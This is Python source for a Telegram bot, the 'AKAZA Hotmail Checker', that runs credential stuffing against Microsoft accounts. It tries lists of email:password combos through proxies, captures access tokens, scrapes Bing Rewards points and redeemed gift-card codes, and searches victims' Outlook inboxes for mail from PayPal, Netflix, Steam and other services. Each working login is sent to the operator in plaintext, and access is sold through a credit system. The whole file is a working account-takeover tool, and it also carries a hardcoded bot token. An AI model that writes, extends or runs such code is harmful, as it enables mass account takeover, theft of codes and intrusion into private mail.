import re
import json
import uuid
import sqlite3
import logging
import asyncio
import time
import os
import random
import threading
import requests
import urllib3
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from html import escape
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

# Logging Setup
urllib3.disable_warnings()
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# SECTION 3 — CONFIG CONSTANTS
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '5944410248'))
DB = os.environ.get('DB_PATH', 'checker.db')
MAX_EXECUTOR_WORKERS = 500

SFTAG_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
db_lock = threading.Lock()

# SECTION 4 — AkazaDatabase CLASS
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path

    def _execute(self, query, params=(), fetchone=False, fetchall=False, commit=True):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            try:
                cursor = conn.cursor()
                cursor.execute(query, params)
                if commit: conn.commit()
                if fetchone: return cursor.fetchone()
                if fetchall: return cursor.fetchall()
            finally: conn.close()

    def init_db(self):
        self._execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            join_date TEXT, access_expiry TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY, keywords TEXT,
            threads INTEGER DEFAULT 10, fast_mode INTEGER DEFAULT 0)''')
        self._execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
            email TEXT, status TEXT, details TEXT, date TEXT)''')
        # Migrations
        try: self._execute('ALTER TABLE users ADD COLUMN access_expiry TEXT')
        except: pass
        try: self._execute('ALTER TABLE settings ADD COLUMN fast_mode INTEGER DEFAULT 0')
        except: pass

    def add_user(self, uid, username, first_name):
        # Default 2000 credits for new users
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date, credits) VALUES (?, ?, ?, ?, ?)',
                      (uid, username, first_name, datetime.now().isoformat(), 2000))
        self._execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))

    def is_banned(self, uid):
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res[0]) if res else False

    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res or res[2] or not res[0]: return False
        if res[1]:
            try:
                if datetime.now() > datetime.fromisoformat(res[1]): return False
            except: return False
        return True

    def is_mod(self, uid):
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res[0]) if res else False

    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        self._execute('UPDATE users SET credits = MAX(0, credits - 1) WHERE user_id = ?', (uid,))

    def has_credits(self, uid):
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return (res[0] > 0) if res else False

    def get_user_info(self, uid):
        res = self._execute('SELECT user_id, username, first_name, credits, has_access, is_banned, is_mod, total_checks, total_hits, join_date, access_expiry FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            cols = ['user_id', 'username', 'first_name', 'credits', 'has_access', 'is_banned', 'is_mod', 'total_checks', 'total_hits', 'join_date', 'access_expiry']
            return dict(zip(cols, res))
        return {}

    def get_user_settings(self, uid):
        res = self._execute('SELECT keywords, threads, fast_mode FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = res[0].split(',') if res[0] else []
            return {'keywords': kws, 'threads': res[1], 'fast_mode': bool(res[2])}
        return {'keywords': [], 'threads': 10, 'fast_mode': False}

    def update_settings(self, uid, keywords=None, threads=None, fast_mode=None):
        if keywords is not None: self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (','.join(keywords), uid))
        if threads is not None: self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
        if fast_mode is not None: self._execute('UPDATE settings SET fast_mode = ? WHERE user_id = ?', (1 if fast_mode else 0, uid))

    def save_result(self, uid, email, status, details_dict):
        self._execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)',
                      (uid, email, status, json.dumps(details_dict), datetime.now().isoformat()))
        if status == 'hit': self._execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
        else: self._execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))

    def user_stats(self, uid):
        res = self._execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if res: return {'checks': res[0], 'hits': res[1], 'credits': res[2]}
        return {'checks': 0, 'hits': 0, 'credits': 0}

    def get_global_stats(self):
        total = self._execute('SELECT COUNT(*) FROM users', fetchone=True)[0]
        active = self._execute('SELECT COUNT(*) FROM users WHERE has_access = 1', fetchone=True)[0]
        checks = self._execute('SELECT SUM(total_checks) FROM users', fetchone=True)[0] or 0
        hits = self._execute('SELECT SUM(total_hits) FROM users', fetchone=True)[0] or 0
        return {'total': total, 'active': active, 'checks': checks, 'hits': hits}

    def list_mods(self):
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        return [{'uid': r[0], 'username': r[1]} for r in res] if res else []

    def grant_access(self, uid, days=None):
        if days:
            exp = (datetime.now() + timedelta(days=days)).isoformat()
            self._execute('UPDATE users SET has_access = 1, access_expiry = ? WHERE user_id = ?', (exp, uid))
        else:
            self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))

    def revoke_access(self, uid):
        self._execute('UPDATE users SET has_access = 0, access_expiry = NULL WHERE user_id = ?', (uid,))

    def ban(self, uid): self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))
    def unban(self, uid): self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))
    def set_mod(self, uid, val): self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (val, uid))

    def get_all_user_ids(self):
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        return [r[0] for r in res] if res else []

akaza_db = AkazaDatabase(DB)

# SECTION 5 — SERVICE_KEYWORDS DICT
SERVICE_KEYWORDS = {
    "instagram.com": "Instagram", "facebook.com": "Facebook", "twitter.com": "Twitter", "x.com": "Twitter", "tiktok.com": "TikTok", "discord.com": "Discord", "netflix.com": "Netflix", "spotify.com": "Spotify", "disneyplus.com": "Disney+", "hulu.com": "Hulu", "hbo.com": "HBO", "primevideo.com": "Amazon Prime", "xbox.com": "Xbox", "playstation.com": "PlayStation", "sony.com": "PlayStation", "steampowered.com": "Steam", "epicgames.com": "Epic Games", "minecraft.net": "Minecraft", "roblox.com": "Roblox", "paypal.com": "PayPal", "amazon.com": "Amazon", "ebay.com": "eBay", "aliexpress.com": "AliExpress", "nike.com": "Nike", "adidas.com": "Adidas", "uber.com": "Uber", "airbnb.com": "Airbnb"
}

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str: return None
    if proxy_str.startswith(('http://','https://','socks')): return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4: return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    elif len(parts) == 2: return f'http://{proxy_str}'
    return proxy_str

# SECTION 6 — AkazaChecker CLASS
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            p = format_proxy(proxy)
            if p: self.session.proxies = {'http': p, 'https': p}
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'})

    def get_sftag_params(self):
        for _ in range(3):
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'}
                text = self.session.get(SFTAG_URL, headers=headers, timeout=10, verify=False).text
                match = re.search('value=\\\\"(.+?)\\\\"', text, re.S) or re.search('value="(.+?)"', text, re.S) or re.search("sFTTag:'(.+?)'", text, re.S) or re.search('sFTTag:"(.+?)"', text, re.S) or re.search('name="PPFT".*?value="(.+?)"', text, re.S)
                if match:
                    ppft = match.group(1)
                    match = re.search('"urlPost":"(.+?)"', text, re.S) or re.search("urlPost:'(.+?)'", text, re.S) or re.search('urlPost:"(.+?)"', text, re.S) or re.search('<form.*?action="(.+?)"', text, re.S)
                    if match: return (match.group(1).replace('&amp;', '&'), ppft)
            except: pass
            time.sleep(0.1)
        return (None, None)

    def do_login(self, email, password, urlPost, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                resp = self.session.post(urlPost, data=data, allow_redirects=True, timeout=12, verify=False)
                if '#' in resp.url and resp.url != SFTAG_URL:
                    token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None': return ('TOKEN', token)
                elif any(val in resp.text for val in ['recover?mkt', 'identity/confirm', '/Abuse?mkt=']): return ('2FA', None)
                elif any(val in resp.text.lower() for val in ['password is incorrect', "account doesn't exist", 'tried to sign in too many times']): return ('BAD', None)
            except: pass
            time.sleep(0.1)
        return ('ERROR', None)

    def handle_fmhf(self, resp):
        for _ in range(5):
            if 'fmHF' not in resp.text: break
            try:
                soup = BeautifulSoup(resp.text, 'html.parser')
                form = soup.find('form', id='fmHF')
                if not form: break
                action = form['action']
                if action.startswith('/'): action = 'https://login.live.com' + action
                data = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}
                resp = self.session.post(action, data=data, timeout=10, verify=False, allow_redirects=True)
            except: break
        return resp

    def get_rewards_points(self):
        try:
            r = self.session.get("https://rewards.bing.com/api/getuserinfo", timeout=8)
            if r.status_code == 200:
                d = r.json(); pts = d.get('availablePoints') or d.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                if pts is not None: return int(pts)
        except: pass
        return 0

    def get_redemption_codes(self):
        codes = []
        try:
            r = self.session.get('https://rewards.bing.com/redeem/orderhistory', timeout=10); r = self.handle_fmhf(r)
            soup = BeautifulSoup(r.text, 'html.parser'); vt = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            token = vt['value'] if vt else ''; table = soup.find('table', class_='table'); rows = table.find_all('tr') if table else []
            pat = [r'\b[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}\b', r'\b[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}\b', r'\b[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}\b']
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3: continue
                title = cells[2].get_text(strip=True); date = cells[1].get_text(strip=True); btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act.startswith('/'): act = 'https://rewards.bing.com' + act
                    try:
                        h = {'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded'}
                        cr = self.session.post(act, data={'__RequestVerificationToken': token}, headers=h, timeout=10)
                        val = None; rs = BeautifulSoup(cr.text, 'html.parser').find('div', class_='resendSuccess')
                        if rs:
                            for k, v in zip(rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I)), rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))):
                                if any(x in k.get_text(strip=True).upper() for x in ['CODE', 'PIN']): val = v.get_text(strip=True); break
                        if not val:
                            for p in pat:
                                m = re.search(p, cr.text)
                                if m: val = m.group(); break
                        if val: codes.append({'code': val, 'info': title, 'date': date})
                    except: pass
        except: pass
        return codes

    def scan_inbox(self, email, tk, cid, uk):
        ic = "0"; h = {"Host": "outlook.live.com", "content-length": "0", "authorization": f"Bearer {tk}", "user-agent": "Mozilla/5.0", "action": "StartupData", "content-type": "application/json"}
        try:
            r = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers=h, timeout=15)
            if r.status_code == 200:
                m = re.search(r'"DisplayName":"Inbox","TotalCount":(\d+)', r.text) or re.search(r'"TotalCount":(\d+)', r.text)
                if m: ic = m.group(1)
        except: pass
        res = {}; combined = list(set(list(SERVICE_KEYWORDS.keys()) + uk)); h2 = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
        for i in range(0, len(combined), 8):
            batch = combined[i:i+8]; queries = [f'from:"{k}" OR "{k}"' if "@" in k and " " not in k else k for k in batch]; q = " OR ".join(queries)
            payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": q}, "Size": 5}]}
            try:
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=h2, timeout=10)
                if r.status_code == 200 and r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0) > 0:
                    for j, k in enumerate(batch):
                        payload['EntityRequests'][0]['Query']['QueryString'] = queries[j]
                        ri = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=h2, timeout=10)
                        if ri.status_code == 200:
                            ti = ri.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                            if ti > 0: name = SERVICE_KEYWORDS.get(k, k); res[name] = res.get(name, 0) + ti
            except: pass
        return res, ic

    def check(self, email, password, uk=[], fm=False):
        try:
            r1 = self.session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", timeout=10)
            if "MSAccount" not in r1.text: return {'status': 'bad'}
        except: pass
        urlPost, ppft = self.get_sftag_params()
        if not urlPost: return {'status': 'error'}
        st, tk = self.do_login(email, password, urlPost, ppft)
        if st != 'TOKEN': return {'status': st.lower() if st else 'error'}
        cid = ''
        for cookie in self.session.cookies:
            if cookie.name == 'MSPCID': cid = cookie.value.upper(); break
        pts = 0; codes = []
        if not fm:
            try: pts = self.get_rewards_points()
            except: pass
            try: codes = self.get_redemption_codes()
            except: pass
        try: inbox, ic = self.scan_inbox(email, tk, cid, uk)
        except: inbox, ic = {}, '0'
        return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': {"status":"FREE","subs":[]}, 'mc': {"owned": False}, 'inbox': inbox, 'inbox_count': ic}

# SECTION 7 — Telegram Bot Handlers
class AkazaBot:
    def __init__(self, token):
        self.app = Application.builder().token(token).build()
        self.edit_locks = {}; self.user_proxies = {}

    async def check_user(self, update: Update):
        u = update.effective_user
        if not u: return False
        akaza_db.add_user(u.id, u.username, u.first_name)
        if akaza_db.is_banned(u.id):
            await update.effective_message.reply_text("❌ You are banned.")
            return False
        return True

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        uid = update.effective_user.id; info = akaza_db.get_user_info(uid)
        cred = "Unlimited" if uid == ADMIN_ID else info.get('credits', 0); role = "Admin" if uid == ADMIN_ID else ("Moderator" if info.get('is_mod') else "User")
        msg = (f"💠 <b>AKAZA Hotmail Checker</b> 💠\n\n👤 <b>User:</b> <code>{escape(update.effective_user.first_name or 'User')}</code>\n🆔 <b>ID:</b> <code>{uid}</code>\n🎖 <b>Role:</b> <code>{role}</code>\n💰 <b>Credits:</b> <code>{cred}</code>\n👑 <b>Admin:</b> @Akaza_admin\n\n📥 <b>Send a .txt combo (email:pass) or text to start.</b>")
        kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")], [InlineKeyboardButton("🔍 Keywords", callback_data="keywords"), InlineKeyboardButton("🔌 Proxy", callback_data="proxy")], [InlineKeyboardButton("🆘 Help", callback_data="help")]]
        await update.effective_message.reply_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode=ParseMode.HTML)

    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        if not akaza_db.has_access(update.effective_user.id):
            await update.effective_message.reply_text("❌ No access. Contact Admin."); return
        text = update.effective_message.text
        if text.startswith('!!'): await self.admin_cmd_handler(update, context); return
        combos = [l.strip() for l in text.splitlines() if ':' in l]
        if combos: asyncio.create_task(self.process_checking(update, context, combos))
        else: await update.effective_message.reply_text("❓ No valid combos found.")

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        if not akaza_db.has_access(update.effective_user.id):
            await update.effective_message.reply_text("❌ No access."); return
        doc = update.effective_message.document; cap = update.effective_message.caption or ""; uid = update.effective_user.id
        if doc.file_name.endswith('.txt'):
            f = await context.bot.get_file(doc.file_id); c = await f.download_as_bytearray(); text = c.decode('utf-8', errors='ignore')
            if 'proxies' in doc.file_name.lower() or 'prox' in cap.lower():
                self.user_proxies[uid] = [l.strip() for l in text.splitlines() if l.strip()]
                await update.effective_message.reply_text(f"✅ Loaded {len(self.user_proxies[uid])} proxies.")
            else:
                combos = [l.strip() for l in text.splitlines() if ':' in l]
                if combos: asyncio.create_task(self.process_checking(update, context, combos))
                else: await update.effective_message.reply_text("❓ No combos.")

    async def process_checking(self, update: Update, context: ContextTypes.DEFAULT_TYPE, combos):
        uid = update.effective_user.id; settings = akaza_db.get_user_settings(uid); limit = asyncio.Semaphore(settings['threads'])
        user_p = self.user_proxies.pop(uid, []); total = len(combos); hits, bad, twofa, err, checked = 0, 0, 0, 0, 0; last_hits = []
        status_msg = await update.effective_message.reply_text(f"🚀 Initializing checker with {len(user_p) or 'no'} proxies...")
        self.edit_locks[status_msg.message_id] = {'lock': asyncio.Lock(), 'last_time': 0}
        async def update_status(force=False):
            info = self.edit_locks.get(status_msg.message_id)
            if not info: return
            now = time.time()
            if not force and now - info['last_time'] < 3: return
            async with info['lock']:
                ht_lines = [f"✅ <code>{escape(h['email'])}</code> | {h['pts']} Pts" for h in last_hits[-5:]]
                ht = "\n".join(ht_lines)
                text = (f"⚡ <b>Checking...</b>\n\n📈 <b>Progress:</b> <code>{checked}/{total}</code>\n✅ <b>Hits:</b> <code>{hits}</code>\n❌ <b>Bad:</b> <code>{bad}</code>\n🔐 <b>2FA:</b> <code>{twofa}</code>\n⚠️ <b>Err:</b> <code>{err}</code>\n\n<b>Last Hits:</b>\n{ht or 'None'}")
                try: await status_msg.edit_text(text, parse_mode=ParseMode.HTML); info['last_time'] = time.time()
                except: pass
        loop = asyncio.get_running_loop()
        async def worker(combo):
            nonlocal hits, bad, twofa, err, checked
            async with limit:
                if not akaza_db.has_credits(uid): return
                parts = combo.split(':'); email, password = parts[0], parts[1]
                checker = AkazaChecker(random.choice(user_p) if user_p else None)
                res = await loop.run_in_executor(bot_executor, checker.check, email, password, settings['keywords'], settings['fast_mode'])
                checked += 1
                if res['status'] == 'hit':
                    hits += 1; last_hits.append(res); akaza_db.save_result(uid, email, 'hit', res)
                    try: await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔥 <b>HIT:</b> <code>{escape(email)}:{escape(password)}</code>\n💰 <b>Pts:</b> <code>{res['pts']}</code>\n📥 <b>Inbox:</b> <code>{res['inbox_count']}</code>", parse_mode=ParseMode.HTML)
                    except: pass
                elif res['status'] == 'bad': bad += 1
                elif res['status'] == '2fa': twofa += 1; akaza_db.save_result(uid, email, '2fa', {})
                else: err += 1
                akaza_db.use_credit(uid); await update_status()
        await asyncio.gather(*[worker(c) for c in combos]); await update_status(force=True)
        fname = f"hits_{uid}_{int(time.time())}.txt"
        with open(fname, 'w') as f:
            for h in last_hits:
                f.write(f"Email: {h['email']}\nPassword: {h['password']}\nPoints: {h['pts']}\nInbox: {h['inbox_count']}\n" + ("Inbox Hits:\n" + "\n".join([f" - {k}: {v}" for k,v in h['inbox'].items()]) if h['inbox'] else "") + "\n" + "-"*30 + "\n\n")
        await update.effective_message.reply_document(document=open(fname, 'rb'), caption=f"🏁 Check Completed!\n✅ Total Hits: {hits}"); os.remove(fname)

    async def admin_cmd_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if not akaza_db.is_mod(uid): return
        parts = update.effective_message.text.split(); cmd = parts[0].lower()
        if cmd == '!!help': await update.effective_message.reply_text("!!addcredits [id] [amt], !!grant [id] [days], !!stats, !!broadcast [msg]")
        elif cmd == '!!addcredits' and len(parts) == 3: akaza_db.add_credits(int(parts[1]), int(parts[2])); await update.effective_message.reply_text("✅")
        elif cmd == '!!grant' and len(parts) >= 2: target = int(parts[1]); days = int(parts[2]) if len(parts) == 3 else None; akaza_db.grant_access(target, days); await update.effective_message.reply_text("✅")
        elif cmd == '!!stats': gs = akaza_db.get_global_stats(); await update.effective_message.reply_text(f"📊 {gs}")
        elif cmd == '!!broadcast' and len(parts) > 1:
            m = " ".join(parts[1:]); count = 0
            for u in akaza_db.get_all_user_ids():
                try: await context.bot.send_message(chat_id=u, text=f"📢 {m}"); count += 1
                except: pass
            await update.effective_message.reply_text(f"✅ Sent to {count}.")

    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query; await query.answer(); uid = update.effective_user.id
        if query.data == "stats":
            st = akaza_db.user_stats(uid); await query.edit_message_text(f"📊 Checks: {st['checks']}, Hits: {st['hits']}, Credits: {st['credits']}", parse_mode=ParseMode.HTML)
        elif query.data == "settings":
            s = akaza_db.get_user_settings(uid); await query.edit_message_text(f"⚙️ Threads: {s['threads']}, Fast: {s['fast_mode']}", parse_mode=ParseMode.HTML)
        elif query.data == "proxy":
            pc = len(self.user_proxies.get(uid, [])); await query.edit_message_text(f"🔌 Proxy: {pc} loaded.", parse_mode=ParseMode.HTML)
        elif query.data == "keywords":
            s = akaza_db.get_user_settings(uid); await query.edit_message_text(f"🔍 Keywords: {', '.join(s['keywords']) or 'None'}", parse_mode=ParseMode.HTML)
        elif query.data == "help": await query.edit_message_text("🆘 Send combo. /threads, /addkw.")

    async def set_threads(self, update, context):
        try: akaza_db.update_settings(update.effective_user.id, threads=int(context.args[0])); await update.effective_message.reply_text("✅")
        except: pass
    async def add_kw(self, update, context):
        try:
            raw = " ".join(context.args); nk = [k.strip() for k in re.split(r'[,\s]+', raw) if k.strip()]
            s = akaza_db.get_user_settings(update.effective_user.id); akaza_db.update_settings(update.effective_user.id, keywords=list(set(s['keywords'] + nk)))
            await update.effective_message.reply_text("✅")
        except: pass
    async def clear_kw(self, update, context): akaza_db.update_settings(update.effective_user.id, keywords=[]); await update.effective_message.reply_text("✅")

    def run(self):
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("threads", self.set_threads))
        self.app.add_handler(CommandHandler("addkw", self.add_kw))
        self.app.add_handler(CommandHandler("clearkw", self.clear_kw))
        self.app.add_handler(CallbackQueryHandler(self.callback_handler))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
        self.app.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
        self.app.run_polling(drop_pending_updates=True)

def bot_main_exec():
    akaza_db.init_db()
    if ADMIN_ID: akaza_db.add_user(ADMIN_ID, "Admin", "Admin"); akaza_db.grant_access(ADMIN_ID); akaza_db.set_mod(ADMIN_ID, 1)
    AkazaBot(BOT_TOKEN).run()

if __name__ == "__main__":
    bot_main_exec()
